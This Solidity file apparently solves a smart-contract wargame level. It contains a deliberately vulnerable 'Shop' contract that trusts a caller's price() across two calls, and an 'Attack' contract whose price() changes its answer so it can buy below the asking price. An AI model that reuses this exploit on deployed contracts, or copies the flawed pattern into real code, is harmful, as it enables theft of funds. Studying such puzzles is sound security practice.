//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }

  function refresh() public {
    price = 100;
    isSold = false;
  }
}

contract Attack {
  address _addr = 0xeE01078E871a129Fd654D1B3c4d881003e31Fc49;
  Shop _shop = Shop(_addr);

  function kek() public {
    _shop.buy();
  }

  function price() public view returns (uint) {
    if (!_shop.isSold()) {
      return 101;
    } else {
      return 1;
    } 
  }
}


















